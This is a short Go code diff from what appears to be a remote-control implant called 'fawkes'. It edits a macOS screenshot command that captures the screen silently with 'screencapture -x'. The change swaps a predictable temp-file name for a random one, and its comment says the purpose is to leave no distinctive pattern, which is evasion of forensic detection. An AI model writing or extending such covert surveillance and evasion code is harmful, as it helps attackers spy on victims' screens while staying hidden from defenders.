@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"time"
 
 	"fawkes/pkg/structs"
@@ -24,8 +23,17 @@ func (c *ScreenshotDarwinCommand) Description() string {
 }
 
 func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResult {
-	// Create temp file for screenshot
-	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".sc_%d.png", time.Now().UnixNano()))
+	// Create temp file for screenshot — random name (no distinctive pattern)
+	tf, tfErr := os.CreateTemp("", "*.png")
+	if tfErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error creating temp file: %v", tfErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	tmpFile := tf.Name()
+	tf.Close()
 
 	// Use screencapture: -x = no sound, -t png = PNG format
 	cmd := exec.Command("screencapture", "-x", "-t", "png", tmpFile)
